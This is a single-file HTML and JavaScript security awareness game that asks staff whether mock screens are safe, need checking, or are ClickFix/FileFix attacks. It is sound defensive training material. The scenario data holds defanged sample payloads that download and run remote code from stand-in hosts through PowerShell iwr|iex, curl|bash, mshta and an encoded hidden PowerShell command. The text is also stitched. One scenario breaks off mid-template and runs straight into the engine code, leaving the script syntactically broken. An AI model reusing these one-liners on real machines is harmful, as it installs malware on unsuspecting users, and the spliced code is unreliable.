<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Fix or Phish? — ClickFix &amp; FileFix awareness challenge</title>
<meta name="description" content="An interactive security awareness challenge for everyone, not just cyber people. Can you tell a genuine IT screen from a ClickFix attack?">
<style>
  :root{
    --bg:#0B0E13;
    --card:#151A21;
    --card2:#1C232C;
    --line:#2A323D;
    --text:#E8EBEF;
    --dim:#8A94A2;
    --accent:#00D0A4;
    --warn:#FFB020;
    --bad:#FF4D5E;
    --good:#22C58B;
    --sans:"Segoe UI",system-ui,-apple-system,"Helvetica Neue",Arial,sans-serif;
    --mono:ui-monospace,"Cascadia Mono",Consolas,"SF Mono",Menlo,monospace;
    --r:10px;
  }
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0;background:
      radial-gradient(1100px 600px at 12% -10%,#12313080,transparent 60%),
      radial-gradient(900px 500px at 100% 0%,#2a1f0a80,transparent 55%),
      var(--bg);
    color:var(--text);font-family:var(--sans);-webkit-font-smoothing:antialiased;
    display:flex;justify-content:center;padding:76px 16px 40px;
  }
  .stage{width:100%;max-width:900px}

  /* ---------- top bar ---------- */
  .topbar{
    position:fixed;top:0;left:0;right:0;z-index:60;display:flex;align-items:center;gap:12px;
    padding:12px 18px;background:#0B0E13E6;border-bottom:1px solid var(--line);
    backdrop-filter:blur(8px);
  }
  .logo{
    width:30px;height:30px;flex:none;border-radius:7px;display:grid;place-items:center;
    background:linear-gradient(140deg,var(--accent),#0B8C77);color:#04150F;
    font-weight:900;font-size:15px;font-family:var(--mono)
  }
  .brand{font-size:13.5px;font-weight:700;line-height:1.25}
  .brand small{display:block;font-size:10.5px;font-weight:500;color:var(--dim);letter-spacing:.03em}
  .topbar .spacer{flex:1}
  .linkbtn{
    background:none;border:1px solid var(--line);color:var(--dim);font-family:inherit;
    font-size:12px;font-weight:600;padding:7px 12px;border-radius:6px;cursor:pointer
  }
  .linkbtn:hover{color:var(--text);border-color:var(--dim)}

  /* ---------- typography ---------- */
  h1{font-size:clamp(38px,8vw,74px);line-height:.94;letter-spacing:-.035em;font-weight:800;margin:0 0 16px}
  h1 em{font-style:normal;color:var(--accent)}
  h2{font-size:clamp(22px,4vw,30px);letter-spacing:-.02em;margin:0 0 12px}
  .eyebrow{font-size:11.5px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;color:var(--warn);margin:0 0 12px}
  .lede{font-size:clamp(15.5px,2.2vw,19px);line-height:1.55;color:#C3CAD3;max-width:56ch;margin:0 0 14px}
  .rule{
    border-left:3px solid var(--warn);padding:12px 0 12px 16px;margin:22px 0;
    font-size:clamp(16px,2.4vw,20px);line-height:1.45;font-weight:700;max-width:56ch
  }
  .tiny{font-size:12.5px;color:var(--dim);line-height:1.5}

  /* ---------- buttons ---------- */
  button{font-family:inherit;cursor:pointer;border:0}
  .big{
    background:var(--accent);color:#04150F;font-size:19px;font-weight:800;
    padding:16px 32px;border-radius:8px;letter-spacing:-.01em
  }
  .big:hover{background:#22E7BD}
  .big.alt{background:var(--card2);color:var(--text);border:1px solid var(--line)}
  .big.alt:hover{border-color:var(--dim)}
  button:focus-visible,input:focus-visible{outline:3px solid var(--warn);outline-offset:2px}
  .foot{display:flex;gap:12px;margin-top:26px;flex-wrap:wrap;align-items:center}

  /* ---------- form ---------- */
  .field{margin:16px 0 0;max-width:400px}
  .field label{display:block;font-size:12.5px;color:var(--dim);margin-bottom:6px;font-weight:700}
  .field input{
    width:100%;background:var(--card);border:1px solid var(--line);border-radius:8px;
    color:var(--text);font-size:16px;padding:13px 14px;font-family:inherit
  }
  .field input::placeholder{color:#5A6371}
  .err{color:var(--bad);font-size:13px;font-weight:700;margin:12px 0 0}

  /* ---------- how to play ---------- */
  .howto{list-style:none;margin:0 0 8px;padding:0;max-width:60ch}
  .howto li{display:flex;gap:14px;padding:11px 0;border-top:1px solid var(--line);font-size:15px;line-height:1.5;color:#C3CAD3}
  .howto li:last-child{border-bottom:1px solid var(--line)}
  .howto b{color:var(--text)}
  .num{
    width:25px;height:25px;flex:none;border-radius:50%;background:var(--card2);border:1px solid var(--line);
    color:var(--accent);font-size:12px;font-weight:800;display:grid;place-items:center
  }

  /* ---------- round chrome ---------- */
  .meta{display:flex;align-items:center;gap:12px;margin-bottom:10px;flex-wrap:wrap}
  .pips{display:flex;gap:4px;flex:1;min-width:120px}
  .pip{height:4px;flex:1;background:var(--line);border-radius:3px}
  .pip.done{background:var(--dim)}
  .pip.now{background:var(--accent)}
  .chip{
    font-size:11px;font-weight:800;letter-spacing:.06em;text-transform:uppercase;
    padding:4px 9px;border-radius:999px;border:1px solid var(--line);color:var(--dim);white-space:nowrap
  }
  .chip.d2{color:var(--warn);border-color:#5A430F}
  .chip.d3{color:var(--bad);border-color:#5A2029}
  .chip.pts{color:var(--accent);border-color:#12503F;font-variant-numeric:tabular-nums}
  .clock{height:4px;background:var(--line);border-radius:3px;overflow:hidden;margin-bottom:18px}
  .clock i{display:block;height:100%;background:var(--accent);width:100%;transform-origin:left}
  .clock i.low{background:var(--bad)}
  .prompt{font-size:14.5px;color:var(--dim);margin:0 0 10px;line-height:1.5}
  .prompt b{color:var(--text);font-weight:600}

  /* ---------- mock screen ---------- */
  .screen{background:#0A0C10;border:1px solid var(--line);border-radius:12px;overflow:hidden;box-shadow:0 22px 50px #00000073}
  .bar{display:flex;align-items:center;gap:8px;padding:9px 12px;background:#161B22;border-bottom:1px solid var(--line)}
  .dot{width:9px;height:9px;border-radius:50%;background:#39414C;flex:none}
  .url{
    flex:1;background:#0A0C10;border-radius:5px;padding:5px 10px;color:#9AA3AE;
    font-family:var(--mono);font-size:11.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis
  }
  .lock{font-size:11px;color:#5F6875;flex:none}
  .body{padding:24px 22px;background:#F4F5F7;color:#15181D}
  .body.dark{background:#12161B;color:#E4E8ED}
  .body h3{margin:0 0 10px;font-size:19px;font-weight:700;letter-spacing:-.01em}
  .body p{margin:0 0 11px;font-size:14.5px;line-height:1.55}
  .body .muted{color:#5A6371;font-size:13px}
  .body.dark .muted{color:#98A2AE}
  .steps{margin:14px 0 0;padding:0;list-style:none;font-size:14.5px}
  .steps li{display:flex;gap:9px;align-items:center;padding:6px 0;flex-wrap:wrap}
  .key{
    font-family:var(--mono);font-size:11.5px;background:#E4E6EA;border:1px solid #C4C9D0;
    border-bottom-width:2px;border-radius:4px;padding:2px 7px;white-space:nowrap;color:#15181D
  }
  .body.dark .key{background:#222A33;border-color:#39414C;color:#E4E8ED}
  .cmdbox{
    font-family:var(--mono);font-size:11.5px;background:#E8EAEE;border:1px solid #C9CED5;
    border-radius:5px;padding:10px 12px;color:#3A4149;word-break:break-all;margin-top:10px
  }
  .body.dark .cmdbox{background:#0C1015;border-color:#2A323D;color:#9AA3AE}
  .cta{display:inline-block;margin-top:12px;background:#2563EB;color:#fff;border-radius:6px;padding:9px 18px;font-size:13.5px;font-weight:700}
  .cta.grey{background:#4B5563;margin-left:8px}
  .box{border:1px solid #C9CED5;background:#fff;border-radius:6px;padding:14px;display:flex;align-items:center;gap:12px}
  .check{width:21px;height:21px;border:2px solid #9AA3AE;border-radius:3px;background:#fff;flex:none}
  .brandline{font-size:10.5px;color:#6B7480;margin-left:auto;text-align:right;line-height:1.35}
  .sticker{background:#FFF6D6;border:1px dashed #C9A227;border-radius:6px;padding:14px;display:flex;gap:14px;align-items:center}
  .qr{
    width:72px;height:72px;flex:none;border:4px solid #fff;outline:1px solid #C9CED5;
    background:repeating-linear-gradient(90deg,#15181D 0 6px,#fff 6px 12px),
               repeating-linear-gradient(0deg,#15181D 0 6px,transparent 6px 12px);
    background-blend-mode:multiply
  }
  .term{
    font-family:var(--mono);font-size:12px;background:#07090C;color:#B7C0CA;
    padding:14px;border-radius:6px;line-height:1.65;white-space:pre-wrap;word-break:break-all;margin-top:10px
  }
  .term .g{color:var(--good)}
  .chatrow{display:flex;gap:10px;align-items:flex-start;margin-bottom:12px}
  .av{width:34px;height:34px;border-radius:50%;flex:none;background:#5B6DF6;color:#fff;display:grid;place-items:center;font-weight:800;font-size:13px}
  .bubble{background:#fff;border:1px solid #C9CED5;border-radius:0 8px 8px 8px;padding:11px 13px;font-size:14px;line-height:1.5}
  .body.dark .bubble{background:#1B222A;border-color:#2A323D}

  /* ---------- answers ---------- */
  .answers{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:16px}
  .ans{
    padding:16px 12px;border-radius:9px;font-size:16px;font-weight:800;line-height:1.2;
    background:var(--card);color:var(--text);border:1px solid var(--line);text-align:center
  }
  .ans span{display:block;font-size:11.5px;font-weight:500;color:var(--dim);margin-top:6px;line-height:1.35}
  .ans kbd{
    display:inline-block;margin-bottom:7px;font-family:var(--mono);font-size:10px;color:var(--dim);
    border:1px solid var(--line);border-radius:4px;padding:1px 5px
  }
  .ans:hover:not(:disabled){border-color:var(--dim)}
  .ans.a-safe:hover:not(:disabled){background:#12241D;border-color:var(--good)}
  .ans.a-ver:hover:not(:disabled){background:#241E10;border-color:var(--warn)}
  .ans.a-att:hover:not(:disabled){background:#241318;border-color:var(--bad)}
  .ans:disabled{opacity:.4}
  .ans.picked{opacity:1;outline:2px solid var(--dim)}

  /* ---------- verdict ---------- */
  .verdict{margin-top:16px;border-radius:10px;overflow:hidden;border:1px solid var(--line)}
  .vhead{padding:13px 18px;font-size:17px;font-weight:800;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;align-items:center}
  .vhead.ok{background:var(--good);color:#04150F}
  .vhead.part{background:var(--warn);color:#1B1403}
  .vhead.no{background:var(--bad);color:#fff}
  .vhead .pts{font-family:var(--mono);font-size:14px}
  .vbody{padding:16px 18px;background:var(--card);font-size:14.5px;line-height:1.6;color:#C9D0D8}
  .vbody .lbl{font-size:11px;font-weight:800;letter-spacing:.1em;text-transform:uppercase;color:var(--dim);margin:14px 0 7px}
  .flags{margin:0;padding:0;list-style:none}
  .flags li{display:flex;gap:9px;padding:5px 0;font-size:14px;line-height:1.45}
  .flags li::before{content:"!";flex:none;width:18px;height:18px;border-radius:50%;background:var(--bad);color:#fff;font-size:11px;font-weight:800;display:grid;place-items:center;margin-top:2px}
  .flags.good li::before{content:"\2713";background:var(--good);color:#04150F}
  .clip{
    font-family:var(--mono);font-size:11.5px;background:#0A0C10;border:1px solid var(--line);
    border-radius:6px;padding:10px 12px;color:#9AA3AE;margin-top:8px;word-break:break-all;line-height:1.6
  }
  .clip b{color:var(--bad);font-weight:700}
  .next{margin-top:14px;display:flex;justify-content:flex-end}

  /* ---------- results ---------- */
  .scorewrap{display:flex;align-items:baseline;gap:16px;flex-wrap:wrap}
  .score{font-size:clamp(58px,15vw,120px);font-weight:800;line-height:.85;letter-spacing:-.045em;margin:0}
  .score small{font-size:.28em;font-weight:700;color:var(--dim);letter-spacing:0}
  .grade{font-size:clamp(19px,3vw,27px);font-weight:800;margin:14px 0 4px;color:var(--accent)}
  .statrow{display:flex;gap:10px;flex-wrap:wrap;margin:18px 0 0}
  .stat{background:var(--card);border:1px solid var(--line);border-radius:9px;padding:12px 16px;min-width:110px}
  .stat b{display:block;font-size:24px;font-variant-numeric:tabular-nums;line-height:1.1}
  .stat span{font-size:11.5px;color:var(--dim)}
  .stat.danger b{color:var(--bad)}
  .takeaways{list-style:none;padding:0;margin:22px 0 0;max-width:60ch}
  .takeaways li{display:flex;gap:12px;padding:10px 0;border-top:1px solid var(--line);font-size:15px;line-height:1.5;color:#C3CAD3}
  .takeaways .num{background:var(--accent);color:#04150F;border:0}

  /* ---------- leaderboard ---------- */
  table{width:100%;border-collapse:collapse;margin-top:16px;font-size:14.5px}
  th,td{text-align:left;padding:11px 10px;border-bottom:1px solid var(--line)}
  th{font-size:11px;letter-spacing:.09em;text-transform:uppercase;color:var(--dim)}
  td.n{font-variant-numeric:tabular-nums;text-align:right}
  tr.me td{color:var(--accent);font-weight:700}
  .empty{color:var(--dim);font-size:14px;margin-top:18px}

  @media (max-width:620px){
    .answers{grid-template-columns:1fr}
    .body{padding:18px 15px}
    body{padding-top:70px}
  }
  @media (prefers-reduced-motion:reduce){
    .clock i{transition:none !important}
  }
</style>
</head>
<body>

<div class="topbar">
  <div class="logo">F?</div>
  <div class="brand">Fix or Phish?<small id="brand-sub">Security Awareness Challenge</small></div>
  <div class="spacer"></div>
  <button class="linkbtn" id="nav-board" hidden>Host view</button>
</div>

<div class="stage" id="stage" aria-live="polite"></div>

<script>
/* ============================================================================
   FIX OR PHISH? — an interactive security awareness challenge
   Single file. No build step, no dependencies, no tracking.

   >>> EDIT THIS BLOCK BEFORE YOUR EVENT <<<
   ========================================================================== */
const CONFIG = {
  orgName:        "Your Organisation",       // shown in the header
  eventName:      "Cyber Awareness Month",   // shown above the title
  reportTo:       "the Security team",       // e.g. "the Cyber Defence Centre"
  reportHow:      "the Report Phishing button in Outlook",
  serviceDesk:    "the IT Service Desk",
  secondsPerRound: 20,                       // time limit per screen
  roundsPerGame:   10,                       // how many screens per player
  askForName:      true,                     // false = anonymous / no sign-in
  recordScores:    true,                     // keep a local record of every game
  // Players never see anyone's score but their own. To open the host view and
  // export to Excel, add #host to the URL or press Ctrl+Shift+H.
  // Optional: paste a Power Automate / Logic App "When an HTTP request is
  // received" URL to log results centrally. Leave blank to keep it fully local.
  resultsEndpoint: ""
};

/* Mix of screens each player gets. Total must equal roundsPerGame. */
const MIX = { attack: 5, safe: 3, verify: 2 };

/* ============================================================================
   SCENARIOS
   answer:     "attack" | "safe" | "verify"
   difficulty: 1 (warm-up) | 2 (tricky) | 3 (expert)
   NOTE: every command shown is deliberately broken/defanged (hxxps, [.], …)
         so nothing here can be copied and run.
   ========================================================================== */
const SCENARIOS = [

/* ---------------------------- ATTACKS ------------------------------------ */
{
  id:"clickfix-captcha", answer:"attack", difficulty:1, tag:"ClickFix",
  prompt:"You search for a document template and click the top result. This appears before the page loads.",
  chrome:{url:"https://doc-preview-verify[.]net/human-check", secure:false},
  screen:`
    <div class="body">
      <div class="box">
        <div class="check"></div>
        <div style="font-size:14.5px;font-weight:600">Verify you are human</div>
        <div class="brandline">Protected by<br>Cloudflare</div>
      </div>
      <p class="muted" style="margin-top:14px">Verification failed. Complete the steps below to confirm you are not a robot.</p>
      <ul class="steps">
        <li><span class="key">Win</span><span class="key">R</span><span>Open the Run dialog</span></li>
        <li><span class="key">Ctrl</span><span class="key">V</span><span>Paste the verification code</span></li>
        <li><span class="key">Enter</span><span>Confirm and continue</span></li>
      </ul>
      <div class="cmdbox">Verification ID copied to clipboard &#10003;</div>
    </div>`,
  title:"That was ClickFix — the most common attack of the year",
  why:"A real CAPTCHA never asks you to leave the page and type on your keyboard. The moment this loaded, the site silently put a command on your clipboard. Pressing Enter in the Run box would have downloaded and run an infostealer — no download prompt, no antivirus warning, because <b>you</b> ran it.",
  flags:[
    "A CAPTCHA that needs the Run dialog is not a CAPTCHA",
    "The clipboard was filled without you copying anything",
    "The domain is not the site you thought you were visiting"
  ],
  clip:"clipboard actually held: <b>powershell -w hidden -c \"iwr hxxps://cdn-verify[.]net/a.ps1 | iex\"</b> # verification ID: 7f2a"
},
{
  id:"filefix-explorer", answer:"attack", difficulty:3, tag:"FileFix",
  prompt:"An email says a colleague shared an inspection report with you. You click through to this page.",
  chrome:{url:"https://sharedrive-docs[.]com/f/inspection-report-q3", secure:false},
  screen:`
    <div class="body">
      <h3>This file lives on your company file share</h3>
      <p>Your browser cannot open network paths directly. Copy the path below and open it in File Explorer instead.</p>
      <ul class="steps">
        <li><span class="key">Ctrl</span><span class="key">C</span><span>Path copied for you &#10003;</span></li>
        <li><span class="key">Win</span><span class="key">E</span><span>Open File Explorer</span></li>
        <li><span class="key">Ctrl</span><span class="key">V</span><span class="key">Enter</span><span>Paste into the address bar</span></li>
      </ul>
      <div class="cmdbox">&#92;&#92;fileshare&#92;inspection&#92;report-Q3.pdf</div>
    </div>`,
  title:"That was FileFix — ClickFix moved into File Explorer",
  why:"The File Explorer address bar runs commands, exactly like the Run box. This variant is popular because it dodges browser download warnings and the Mark-of-the-Web prompt completely. What is <b>displayed</b> to you is not what is on the clipboard — the real command is padded with spaces so it scrolls out of sight.",
  flags:[
    "No legitimate file share needs you to paste a path from a website",
    "The File Explorer address bar executes commands, not just paths",
    "Displayed text and clipboard contents were different"
  ],
  clip:"clipboard actually held: <b>powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA…</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#92;&#92;fileshare&#92;inspection&#92;report-Q3.pdf"
},
{
  id:"mac-terminal", answer:"attack", difficulty:2, tag:"ClickFix · macOS",
  prompt:"You are on a Mac. This opens in a new tab while you are reading an article.",
  chrome:{url:"https://mac-security-check[.]app/verify", secure:false},
  screen:`
    <div class="body">
      <h3>Human verification required</h3>
      <p class="muted">Automated traffic was detected from your network. Complete verification in Terminal to continue browsing.</p>
      <ul class="steps">
        <li><span class="key">&#8984;</span><span class="key">Space</span><span>Open Spotlight, type Terminal</span></li>
        <li><span class="key">&#8984;</span><span class="key">V</span><span class="key">return</span><span>Paste and run the token</span></li>
      </ul>
      <div class="cmdbox">Verification token copied &#10003;</div>
    </div>`,
  title:"Macs are not exempt",
  why:"The same technique targets Terminal on macOS, and a newer variant opens Script Editor for you with the script already loaded so all you do is press run. If a <b>website</b> mentions Terminal, close the tab.",
  flags:[
    "A web page has no legitimate reason to mention Terminal",
    "\u201cVerification\u201d is never done by running commands",
    "Unexpected tab you did not open"
  ],
  clip:"clipboard actually held: <b>curl -s hxxps://mac-security-check[.]app/i | bash</b> # token"
},
{
  id:"teams-audio", answer:"attack", difficulty:2, tag:"ClickFix",
  prompt:"You are two minutes late to a meeting. You click the join link and it fails.",
  chrome:{url:"https://teams-meet-join[.]live/session/restore", secure:false},
  screen:`
    <div class="body">
      <h3>Microphone driver not responding</h3>
      <p>Other participants cannot hear you. Run the quick repair below and rejoin — this usually takes about 15 seconds.</p>
      <ul class="steps">
        <li><span class="key">Win</span><span class="key">R</span><span>Open Run</span></li>
        <li><span class="key">Ctrl</span><span class="key">V</span><span class="key">Enter</span><span>Apply the audio fix</span></li>
      </ul>
      <div class="cmdbox">Fix ID copied to clipboard &#10003;</div>
    </div>`,
  title:"Urgency is the whole attack",
  why:"Meeting-join failures are one of the most effective lures because you are late and not thinking. A genuine audio problem is fixed in your device settings or by rejoining — never by pasting a code into Run. Being in a hurry is exactly when you should slow down.",
  flags:[
    "Time pressure engineered to stop you thinking",
    "The real meeting domain is teams.microsoft.com, not this",
    "Drivers are never repaired by pasting into Run"
  ],
  clip:"clipboard actually held: <b>mshta hxxps://audio-repair[.]live/fix.hta</b> # Teams Audio Fix"
},
{
  id:"printer-qr", answer:"attack", difficulty:2, tag:"Quishing + ClickFix",
  prompt:"The floor printer is jammed again. Someone has taped this notice to the lid.",
  chrome:null,
  screen:`
    <div class="body">
      <div class="sticker">
        <div class="qr"></div>
        <div>
          <div style="font-weight:800;font-size:15px;margin-bottom:4px">PRINTER OUT OF SERVICE</div>
          <div style="font-size:13px;line-height:1.5">Driver conflict affecting this floor.<br>Scan to apply the fix and restore printing for everyone.</div>

/* ============================================================================
   ENGINE
   ========================================================================== */
const BASE_POINTS = 100, SPEED_BONUS = 50, STREAK_BONUS = 25, STREAK_CAP = 100;

/* Partial-credit matrix: CREDIT[correctAnswer][playerChoice] */
const CREDIT = {
  attack: { attack:1,    verify:.6,  safe:0   },
  safe:   { safe:1,      verify:.5,  attack:.25 },
  verify: { verify:1,    attack:.6,  safe:0   }
};

const LABEL = {
  safe:   { name:"Safe",        sub:"Go ahead" },
  verify: { name:"Check first", sub:"Not sure \u2014 verify it" },
  attack: { name:"Attack",      sub:"Report it" }
};

const stage = document.getElementById("stage");
const LB_KEY = "fixorphish.leaderboard.v1";

let rounds = [], idx = 0, score = 0, maxScore = 0, correct = 0, streak = 0,
    pwned = 0, answered = false, timer = null, tStart = 0, player = null, lastEntry = null;

document.getElementById("brand-sub").textContent = CONFIG.orgName + " \u00b7 " + CONFIG.eventName;

/* Scores are host-only. Unlock with #host in the URL or Ctrl+Shift+H. */
let hostUnlocked = location.hash.toLowerCase() === "#host";
const navBoard = document.getElementById("nav-board");
navBoard.onclick = () => renderBoard(true);
function refreshHostNav(){ navBoard.hidden = !hostUnlocked; }
refreshHostNav();

const esc = s => String(s).replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
const tokens = s => String(s)
  .replace(/\{\{reportTo\}\}/g, esc(CONFIG.reportTo))
  .replace(/\{\{reportHow\}\}/g, esc(CONFIG.reportHow))
  .replace(/\{\{serviceDesk\}\}/g, esc(CONFIG.serviceDesk))
  .replace(/\{\{orgName\}\}/g, esc(CONFIG.orgName));

function shuffle(a){
  a = a.slice();
  for (let i = a.length - 1; i > 0; i--){
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

/* Builds a fresh, balanced, randomised set so no two players see the same game. */
function buildRounds(){
  const pick = kind => shuffle(SCENARIOS.filter(s => s.answer === kind)).slice(0, MIX[kind]);
  let set = [...pick("attack"), ...pick("safe"), ...pick("verify")];
  if (set.length > CONFIG.roundsPerGame) set = set.slice(0, CONFIG.roundsPerGame);
  // Easiest first so nobody bounces off round one, then difficulty ramps up.
  return shuffle(set).sort((a, b) => a.difficulty - b.difficulty);
}

/* ---------------------------- screens ------------------------------------ */
function renderStart(){
  clearTimer();
  const needName = CONFIG.askForName && !player;
  stage.innerHTML = `
    <p class="eyebrow">${esc(CONFIG.orgName)} &#183; ${esc(CONFIG.eventName)}</p>
    <h1>Fix or <em>Phish?</em></h1>
    <p class="lede">Attackers don&#8217;t sneak malware onto your laptop any more. They put a helpful-looking message on your screen and let <b>you</b> run it for them.</p>
    <p class="lede"><b>${CONFIG.roundsPerGame} screens. ${CONFIG.secondsPerRound} seconds each.<br>Is it safe, or is it an attack?</b></p>
    ${needName ? `
      <div class="field">
        <label for="p-name">Your name</label>
        <input type="text" id="p-name" autocomplete="name" placeholder="e.g. Alex Taylor" maxlength="40">
      </div>
      <p class="err" id="reg-err" hidden></p>` : ""}
    <div class="foot">
      <button class="big" id="go">Start</button>
      ${hostUnlocked ? `<button class="big alt" id="see-board">Host view</button>` : ""}
    </div>
    <p class="tiny" style="margin-top:20px">Not sure about one? Pick <b>Check first</b> &#8212; being careful still scores points.<br>Nothing here is real, and nothing here can run.</p>`;

  const go = () => {
    if (needName){
      const v = document.getElementById("p-name").value.trim();
      const err = document.getElementById("reg-err");
      if (v.length < 2){ err.textContent = "Enter your name to continue."; err.hidden = false; return; }
      player = v;
    }
    startGame();
  };
  document.getElementById("go").onclick = go;
  document.getElementById("see-board")?.addEventListener("click", () => renderBoard(true));
  const inp = document.getElementById("p-name");
  if (inp){ inp.addEventListener("keydown", e => { if (e.key === "Enter") go(); }); inp.focus(); }
  else document.getElementById("go").focus();
}

function startGame(){
  clearTimer();
  rounds = buildRounds();
  idx = 0; score = 0; correct = 0; streak = 0; pwned = 0;
  maxScore = rounds.reduce((sum, _, i) =>
    sum + BASE_POINTS + SPEED_BONUS + Math.min(STREAK_CAP, STREAK_BONUS * i), 0);
  renderRound();
}

function renderRound(){
  answered = false;
  const r = rounds[idx];
  const pips = rounds.map((_, i) => `<div class="pip ${i < idx ? "done" : i === idx ? "now" : ""}"></div>`).join("");
  const dchip = ["", "Warm-up", "Tricky", "Expert"][r.difficulty];
  const chrome = r.chrome ? `
    <div class="bar">
      <div class="dot"></div><div class="dot"></div><div class="dot"></div>
      <div class="lock">${r.chrome.secure ? "&#128274;" : "&#9888;"}</div>
      <div class="url">${esc(r.chrome.url)}</div>
    </div>` : "";

  stage.innerHTML = `
    <div class="meta">
      <div class="pips">${pips}</div>
      <div class="chip d${r.difficulty}">${dchip}</div>
      <div class="chip">${idx + 1} / ${rounds.length}</div>
      <div class="chip pts">${score} pts</div>
    </div>
    <div class="clock"><i id="bar"></i></div>
    <p class="prompt">${tokens(r.prompt)}</p>
    <div class="screen">${chrome}${r.screen}</div>
    <div class="answers">
      ${["safe","verify","attack"].map(k => `
        <button class="ans a-${k.slice(0,3)}" data-k="${k}">
          <kbd>${k === "safe" ? 1 : k === "verify" ? 2 : 3}</kbd>
          ${LABEL[k].name}<span>${LABEL[k].sub}</span>
        </button>`).join("")}
    </div>
    <div id="slot"></div>`;

  stage.querySelectorAll(".ans").forEach(b => b.onclick = () => answer(b.dataset.k));
  startTimer();
}

function startTimer(){
  const bar = document.getElementById("bar");
  tStart = Date.now();
  bar.style.transition = `transform ${CONFIG.secondsPerRound}s linear`;
  requestAnimationFrame(() => { bar.style.transform = "scaleX(0)"; });
  setTimeout(() => bar?.classList.add("low"), Math.max(0, (CONFIG.secondsPerRound - 5) * 1000));
  timer = setTimeout(() => answer(null), CONFIG.secondsPerRound * 1000);
}
function clearTimer(){ if (timer){ clearTimeout(timer); timer = null; } }

function answer(choice){
  if (answered) return;
  answered = true;
  clearTimer();

  const bar = document.getElementById("bar");
  if (bar){ bar.style.transition = "none"; bar.style.transform = getComputedStyle(bar).transform; }

  const r = rounds[idx];
  const elapsed = (Date.now() - tStart) / 1000;
  const credit = choice ? CREDIT[r.answer][choice] : 0;

  let pts = Math.round(BASE_POINTS * credit);
  if (credit === 1){
    const left = Math.max(0, CONFIG.secondsPerRound - elapsed) / CONFIG.secondsPerRound;
    pts += Math.round(SPEED_BONUS * left);
    streak++;
    pts += Math.min(STREAK_CAP, STREAK_BONUS * (streak - 1));
    correct++;
  } else {
    streak = 0;
  }
  score += pts;

  // "Compromised" = you would actually have run it / handed over access.
  const compromised = (r.answer !== "safe") && (choice === "safe" || choice === null);
  if (compromised) pwned++;

  stage.querySelectorAll(".ans").forEach(b => {
    b.disabled = true;
    if (b.dataset.k === choice) b.classList.add("picked");
  });

  let cls, head;
  if (choice === null){
    cls = compromised ? "no" : "part";
    head = compromised ? "Too slow &#8212; and it was not safe" : "Out of time";
  } else if (credit === 1){
    cls = "ok"; head = "Correct";
  } else if (credit === 0){
    cls = "no";
    head = r.answer === "attack" ? "You just ran the malware" : "That one needed checking first";
  } else {
    cls = "part"; head = "Partly right &#8212; you stayed safe";
  }

  const last = idx === rounds.length - 1;
  document.getElementById("slot").innerHTML = `
    <div class="verdict">
      <div class="vhead ${cls}">
        <span>${head}</span>
        <span class="pts">+${pts} pts${streak > 1 ? " &#183; " + streak + " streak" : ""}</span>
      </div>
      <div class="vbody">
        <div style="font-weight:800;color:var(--text);font-size:16px;margin-bottom:8px">${tokens(r.title)}</div>
        ${tokens(r.why)}
        <div class="lbl">${r.good ? "Why you can trust it" : "What gave it away"}</div>
        <ul class="flags ${r.good ? "good" : ""}">${r.flags.map(f => `<li>${tokens(f)}</li>`).join("")}</ul>
        ${r.clip ? `<div class="clip">${tokens(r.clip)}</div>` : ""}
      </div>
    </div>
    <div class="next"><button class="big" id="nx">${last ? "See your result" : "Next screen"}</button></div>`;

  const nx = document.getElementById("nx");
  nx.onclick = () => { idx++; last ? renderResult() : renderRound(); };
  nx.focus();
}

function renderResult(){
  const pct = Math.round(score / maxScore * 100);
  const grade =
    pwned === 0 && correct === rounds.length ? "Nothing got past you." :
    pwned === 0                              ? "You never would have run it. That is the win." :
    pwned === 1                              ? "One of those would have landed." :
                                               pwned + " of those would have landed.";

  const entry = { name: player || "Anonymous", score, correct, total: rounds.length, pwned, at: Date.now() };
  lastEntry = entry;
  saveScore(entry);
  postResult(entry);

  const hi = player ? player.split(" ")[0] + ", h" : "H";
  stage.innerHTML = `
    <p class="eyebrow">${esc(CONFIG.orgName)} &#183; ${esc(CONFIG.eventName)}</p>
    <p class="lede" style="margin-bottom:10px">${esc(hi)}ere&#8217;s how you did:</p>
    <div class="scorewrap"><p class="score">${score}<small> pts</small></p></div>
    <div class="grade">${grade}</div>
    <div class="statrow">
      <div class="stat"><b>${correct}/${rounds.length}</b><span>Fully correct</span></div>
      <div class="stat"><b>${pct}%</b><span>Of maximum</span></div>
      <div class="stat ${pwned ? "danger" : ""}"><b>${pwned}</b><span>Would have run it</span></div>
    </div>
    <ul class="takeaways">
      <li><span class="num">1</span><div><b>If a fix asks you to paste, it is not a fix.</b> Run, PowerShell, Terminal, the File Explorer address bar &#8212; nothing legitimate ever needs them.</div></li>
      <li><span class="num">2</span><div><b>Not sure? Check another way.</b> Phone them, walk over, or open the app yourself. Never reply through the thing that contacted you.</div></li>
      <li><span class="num">3</span><div><b>Already pasted something?</b> You are not in trouble. Tell ${esc(CONFIG.reportTo)} straight away &#8212; minutes matter. Report anything suspicious via ${esc(CONFIG.reportHow)}.</div></li>
    </ul>
    <div class="foot">
      <button class="big" id="again">Play again</button>
      <button class="big alt" id="newp">Next player</button>
      ${hostUnlocked ? `<button class="big alt" id="board">Host view</button>` : ""}
    </div>`;

  document.getElementById("board")?.addEventListener("click", () => renderBoard(false));
  document.getElementById("again").onclick = () => startGame();
  document.getElementById("newp").onclick = () => { player = null; renderStart(); };
  document.getElementById("again").focus();
}

/* ---------------------------- leaderboard --------------------------------- */
function loadScores(){
  try { return JSON.parse(localStorage.getItem(LB_KEY)) || []; } catch { return []; }
}
function saveScore(e){
  if (!CONFIG.recordScores) return;
  try {
    const all = loadScores();
    all.push(e);
    localStorage.setItem(LB_KEY, JSON.stringify(all.slice(-500)));
  } catch { /* private browsing - leaderboard just won't persist */ }
}

/* Excel opens this directly. The BOM makes it read the file as UTF-8. */
function downloadCsv(){
  const all = loadScores().sort((a, b) => b.score - a.score || a.pwned - b.pwned);
